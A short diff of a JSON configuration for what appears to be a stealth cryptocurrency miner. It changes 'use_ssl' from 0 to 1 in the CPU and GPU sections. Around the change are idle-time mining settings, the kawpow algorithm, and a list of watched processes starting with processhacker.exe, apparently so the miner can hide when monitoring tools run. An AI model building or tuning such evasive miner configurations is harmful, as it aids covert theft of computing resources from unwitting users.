@@ -8,7 +8,7 @@
         "non_idle_usage": 80,
         "idle_usage": 90,
         "wait_time_idle": 1,
-        "use_ssl": 0
+        "use_ssl": 1
     },
     "gpu_config": {
         "mining_url": "",
@@ -17,7 +17,7 @@
         "algo": "kawpow",
         "fan_speed": 80,
         "wait_time_idle": 10,
-        "use_ssl": 0
+        "use_ssl": 1
     },
     "watched_processes": [
         "processhacker.exe",
